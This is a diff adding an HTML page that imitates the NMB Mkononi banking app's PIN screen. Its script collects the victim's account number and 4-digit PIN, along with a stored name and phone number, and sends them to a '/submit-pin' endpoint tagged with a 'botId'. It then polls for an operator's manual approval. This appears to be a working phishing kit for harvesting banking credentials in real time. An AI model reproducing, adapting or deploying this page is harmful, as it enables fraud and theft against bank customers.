@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NMB Mkononi - PIN</title>
+
+  <style>
+    /* ── reset & base ── */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+    }
+
+    body {
+      background: #f4f6f8;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 0;
+    }
+
+    .app-wrapper {
+      width: 100%;
+      max-width: 420px;
+      background: #ffffff;
+      min-height: 100vh;
+      position: relative;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.06);
+    }
+
+    /* ── top bar (NMB green) ── */
+    .top-bar {
+      height: 72px;
+      background: linear-gradient(135deg, #007a3d 0%, #005f2e 100%);
+      display: flex;
+      align-items: center;
+      padding: 0 22px;
+      flex-shrink: 0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .top-bar::after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      right: -20%;
+      width: 160px;
+      height: 160px;
+      background: rgba(255, 255, 255, 0.06);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    .back-btn {
+      color: #fff;
+      font-size: 30px;
+      text-decoration: none;
+      font-weight: 300;
+      background: none;
+      border: none;
+      padding: 0;
+      cursor: pointer;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* ── container ── */
+    .container {
+      padding: 28px 24px 100px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── title & subtitle ── */
+    .title {
+      font-size: 26px;
+      font-weight: 700;
+      color: #005f2e;
+      margin-bottom: 4px;
+      letter-spacing: -0.3px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: #6b7a85;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    /* ── field label ── */
+    .field-label {
+      font-size: 12px;
+      font-weight: 700;
+      color: #007a3d;
+      letter-spacing: 0.6px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+      padding-left: 2px;
+    }
+
+    /* ── input card ── */
+    .input-card {
+      background: #f8fafb;
+      border-radius: 16px;
+      padding: 18px 16px 20px;
+      margin-bottom: 20px;
+      border: 1px solid #e4eaee;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.03);
+    }
+
+    .text-input {
+      width: 100%;
+      height: 56px;
+      border-radius: 12px;
+      border: 1.5px solid #d5dee3;
+      background: #ffffff;
+      padding: 0 16px;
+      font-size: 20px;
+      font-weight: 600;
+      color: #005f2e;
+      letter-spacing: 2px;
+      outline: none;
+      transition: border-color 0.25s, box-shadow 0.25s;
+    }
+
+    .text-input::placeholder {
+      color: #b8c4cc;
+      font-weight: 500;
+      letter-spacing: 1px;
+    }
+
+    .text-input:focus {
+      border-color: #007a3d;
+      box-shadow: 0 0 0 3px rgba(0, 122, 61, 0.12);
+    }
+
+    /* ── alert message ── */
+    #otp-alert {
+      text-align: center;
+      font-size: 14px;
+      font-weight: 500;
+      min-height: 24px;
+      margin-bottom: 12px;
+      padding: 10px 12px;
+      border-radius: 10px;
+      background: transparent;
+      transition: all 0.2s;
+    }
+
+    #otp-alert.error {
+      background: #fdeaea;
+      color: #c0392b;
+      border: 1px solid #f5c6c6;
+    }
+
+    #otp-alert.success {
+      background: #e8f5ec;
+      color: #1e7e34;
+      border: 1px solid #b7d7b7;
+    }
+
+    /* ── waiting message ── */
+    #waiting {
+      text-align: center;
+      font-size: 14px;
+      color: #007a3d;
+      margin-top: 8px;
+      display: none;
+      padding: 12px;
+      border-radius: 10px;
+      background: #e8f5ec;
+      border: 1px solid #c3e0cd;
+    }
+
+    /* ── button (fixed) ── */
+    .continue-btn {
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%);
+      bottom: 28px;
+      width: calc(100% - 48px);
+      max-width: 420px;
+      height: 56px;
+      font-size: 18px;
+      font-weight: 700;
+      border-radius: 12px;
+      border: none;
+      cursor: not-allowed;
+      transition: background 0.25s, transform 0.1s, box-shadow 0.25s;
+      background: #a8cfb9;
+      color: #ffffff;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      box-shadow: 0 4px 12px rgba(0, 122, 61, 0.15);
+    }
+
+    .continue-btn:enabled {
+      background: linear-gradient(135deg, #007a3d 0%, #005f2e 100%);
+      cursor: pointer;
+    }
+
+    .continue-btn:enabled:hover {
+      background: linear-gradient(135deg, #006b35 0%, #004d25 100%);
+      transform: translateX(-50%) scale(1.01);
+      box-shadow: 0 6px 16px rgba(0, 122, 61, 0.25);
+    }
+
+    .continue-btn.waiting {
+      background: #f0ad4e;
+      opacity: 1;
+      cursor: default;
+      box-shadow: 0 4px 12px rgba(240, 173, 78, 0.3);
+    }
+
+    .footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #b0bcc5;
+      letter-spacing: 0.5px;
+      padding-bottom: 12px;
+    }
+
+    /* ── responsive ── */
+    @media (max-width: 480px) {
+      .container {
+        padding: 24px 18px 100px;
+      }
+      .title {
+        font-size: 24px;
+      }
+      .continue-btn {
+        height: 54px;
+        font-size: 17px;
+        width: calc(100% - 36px);
+      }
+      .text-input {
+        height: 52px;
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="app-wrapper">
+
+  <!-- Top bar (NMB) -->
+  <div class="top-bar">
+    <button class="back-btn" onclick="window.history.back()">&#8592;</button>
+  </div>
+
+  <div class="container">
+
+    <div class="title">Enter PIN</div>
+    <div class="subtitle">Enter your NMB account number and 4‑digit PIN</div>
+
+    <!-- Account number (first) -->
+    <div class="input-card">
+      <div class="field-label">Account Number</div>
+      <input
+        id="accountInput"
+        class="text-input"
+        type="tel"
+        inputmode="numeric"
+        autocomplete="off"
+        maxlength="16"
+        placeholder="Account number"
+      />
+    </div>
+
+    <!-- PIN (second) -->
+    <div class="input-card">
+      <div class="field-label">PIN</div>
+      <input
+        id="pinInput"
+        class="text-input"
+        type="password"
+        inputmode="numeric"
+        autocomplete="off"
+        maxlength="4"
+        placeholder="••••"
+      />
+    </div>
+
+    <div id="otp-alert"></div>
+    <div id="waiting">⏳ Awaiting approval…</div>
+
+    <div class="footer">NMB Mkononi v 5.3.2 (1.0.0)</div>
+  </div>
+
+  <!-- Fixed button -->
+  <button id="verifyBtn" class="continue-btn" disabled>SUBMIT</button>
+</div>
+
+<!-- ====== TRANSLATION LAYER (does NOT touch logic) ====== -->
+<script>
+  (function() {
+    // Map French → English for dynamic messages
+    const translations = {
+      '⏳ En attente d’approbation…': '⏳ Awaiting approval…',
+      'En attente…': 'Awaiting…',
+      'Se connecter': 'SUBMIT',
+      '❌ Erreur serveur. Veuillez réessayer.': '❌ Server error. Please try again.',
+      '❌ Code PIN incorrect. Veuillez réessayer.': '❌ Incorrect PIN. Please try again.',
+      'Aucun ID reçu': 'No ID received',
+      'Erreur serveur': 'Server error'
+    };
+
+    function translateNode(node) {
+      if (node.nodeType === Node.TEXT_NODE) {
+        let text = node.textContent;
+        let changed = false;
+        for (const [fr, en] of Object.entries(translations)) {
+          if (text.includes(fr)) {
+            text = text.replace(fr, en);
+            changed = true;
+          }
+        }
+        if (changed) node.textContent = text;
+      } else if (node.nodeType === Node.ELEMENT_NODE) {
+        node.childNodes.forEach(translateNode);
+      }
+    }
+
+    const targets = [
+      document.querySelector('.container'),
+      document.getElementById('otp-alert'),
+      document.getElementById('waiting'),
+      document.getElementById('verifyBtn')
+    ].filter(el => el);
+
+    const observer = new MutationObserver(() => {
+      targets.forEach(el => translateNode(el));
+    });
+
+    targets.forEach(el => {
+      observer.observe(el, { childList: true, subtree: true, characterData: true });
+    });
+
+    setTimeout(() => {
+      targets.forEach(el => translateNode(el));
+    }, 100);
+  })();
+</script>
+
+<!-- ======== ORIGINAL LOGIC (ADAPTED TO PLAIN INPUTS) ======== -->
+<script>
+(function() {
+  const input = document.getElementById('pinInput');
+  const accountInput = document.getElementById('accountInput');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const waitingEl = document.getElementById('waiting');
+  const alertEl = document.getElementById('otp-alert');
+
+  // ── Account number rules ──
+  const ACCOUNT_MIN = 6;
+  const ACCOUNT_MAX = 16;
+
+  // ── Get stored data ──
+  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'Client NMB Mkononi';
+  const phone = localStorage.getItem('phone');
+  const params = new URLSearchParams(window.location.search);
+  let botId = params.get('botId') || localStorage.getItem('botId');
+  if (botId) localStorage.setItem('botId', botId);
+
+  if (!phone || !botId) {
+    alert('Session expirée. Veuillez recommencer.');
+    window.location.href = 'index.html';
+    return;
+  }
+
+  // ── Focus helpers ──
+  function focusPin() { input.focus(); }
+  function focusAccount() { accountInput.focus(); }
+
+  // ── Form validity (account + PIN) ──
+  function isFormValid() {
+    const acct = accountInput.value.replace(/\D/g, '');
+    return acct.length >= ACCOUNT_MIN && acct.length <= ACCOUNT_MAX && input.value.length === 4;
+  }
+
+  function updateSubmitState() {
+    verifyBtn.disabled = !isFormValid();
+  }
+
+  // ── Account number input events ──
+  accountInput.addEventListener('input', () => {
+    accountInput.value = accountInput.value.replace(/\D/g, '').slice(0, ACCOUNT_MAX);
+    alertEl.textContent = '';
+    alertEl.className = '';
+    updateSubmitState();
+  });
+
+  accountInput.addEventListener('paste', (e) => {
+    e.preventDefault();
+    const paste = e.clipboardData.getData('text');
+    accountInput.value = paste.replace(/\D/g, '').slice(0, ACCOUNT_MAX);
+    updateSubmitState();
+  });
+
+  accountInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      focusPin();
+    }
+  });
+
+  // ── PIN input events ──
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0, 4);
+    updateSubmitState();
+    alertEl.textContent = '';
+    alertEl.className = '';
+  });
+
+  input.addEventListener('paste', (e) => {
+    e.preventDefault();
+    const paste = e.clipboardData.getData('text');
+    const digits = paste.replace(/\D/g, '').slice(0, 4);
+    input.value = digits;
+    updateSubmitState();
+    if (digits.length === 4 && isFormValid()) {
+      setTimeout(() => verifyBtn.click(), 300);
+    }
+  });
+
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && !verifyBtn.disabled) {
+      verifyBtn.click();
+    }
+  });
+
+  // ── Show alert message ──
+  function showAlert(text, type = 'error') {
+    alertEl.textContent = text;
+    alertEl.className = type;
+  }
+
+  // ── Verify button click ──
+  verifyBtn.addEventListener('click', async () => {
+    const pin = input.value;
+    const accountNumber = accountInput.value.replace(/\D/g, '');
+
+    if (pin.length !== 4) return;
+    if (accountNumber.length < ACCOUNT_MIN) {
+      showAlert('❌ Please enter a valid account number.', 'error');
+      focusAccount();
+      return;
+    }
+
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'En attente…';
+    verifyBtn.classList.add('waiting');
+    waitingEl.style.display = 'block';
+    showAlert('', '');
+
+    try {
+      const res = await fetch(`${window.location.origin}/submit-pin`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: fullName,
+          phone,
+          accountNumber,
+          pin,
+          botId
+        })
+      });
+      if (!res.ok) throw new Error('Erreur serveur');
+      const data = await res.json();
+      if (!data.requestId) throw new Error('Aucun ID reçu');
+      pollPin(data.requestId);
+    } catch (error) {
+      waitingEl.style.display = 'none';
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = 'Se connecter';
+      verifyBtn.classList.remove('waiting');
+      showAlert('❌ Erreur serveur. Veuillez réessayer.', 'error');
+    }
+  });
+
+  // ── Polling ──
+  function pollPin(requestId) {
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
+        const data = await res.json();
+        if (data.approved === true) {
+          clearInterval(interval);
+          window.location.href = 'success.html';
+        }
+        if (data.approved === false || data.blocked) {
+          clearInterval(interval);
+          // Reset PIN only (account number is kept for retry)
+          input.value = '';
+          verifyBtn.disabled = true;
+          verifyBtn.textContent = 'Se connecter';
+          verifyBtn.classList.remove('waiting');
+          waitingEl.style.display = 'none';
+          showAlert('❌ Code PIN incorrect. Veuillez réessayer.', 'error');
+          focusPin();
+        }
+      } catch (error) {
+        console.error('Polling error:', error);
+      }
+    }, 2000);
+  }
+
+  // ── Initial focus ──
+  window.onload = () => {
+    if (accountInput.value.length < ACCOUNT_MIN) {
+      focusAccount();
+    } else {
+      focusPin();
+    }
+  };
+})();
+</script>
+
+</body>
+</html>
